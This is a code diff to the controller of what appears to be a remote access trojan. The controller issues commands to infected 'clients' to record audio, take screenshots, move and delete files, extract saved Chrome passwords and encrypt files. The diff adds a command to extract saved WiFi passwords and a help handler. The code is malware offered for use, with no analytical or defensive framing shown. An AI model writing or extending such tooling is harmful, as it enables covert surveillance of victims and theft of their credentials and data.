@@ -22,11 +22,12 @@ COMMANDS = {'Commands':['Description'],
             'list':['Lists connected clients'],
             'select':['Selects a client by its index. Takes index as a parameter'],
             'quit':['Stops current connection with a client. To be used when client is selected'],
-            'record <filename_in_which_we_want_save> <time(sec)>':['Records sound of client till amount of time which you specified'],
+            'record <filename_in_which_we_want_save.wav> <time(sec)>':['Records sound of client till amount of time which you specified'],
             'screenshot <filename in which we want save>':['Takes a screenshot of client\'s screens'],
             'upload <file which you want to_upload>':['To upload a file to client.'],
             'download <file which you want to download>':['To download a file from client.'],
             'savedpass <savedpass.txt>':['To extract google chrome saved passwords and save it as the client\'s computer username'],
+            'wifipass <filename.txt>':['To extract WiFi\'s saved passwords and save it as the client\'s computer username'],
             'delete <file which you want to delete>':['To delete a file from the client\'s computer'],
             'browse <website_url e.g. youtube.com>':['Opens the client\'s ms edge and browse the website'],
             'encrypt <filename>':['Encrypt the filename you want to encrypt and send you the salt file of the encrypted file'],
@@ -165,6 +166,8 @@ def send_target_commands(conn):
                 if cmd.startswith("download"):
                     conn.send(str.encode(cmd))
                     download_file(conn, cmd.split()[1])
+                elif cmd.startswith("help"):
+                    print_help()
                 elif cmd.startswith("upload"):
                     conn.send(str.encode(cmd))
                     upload_file(conn, cmd.split()[1])
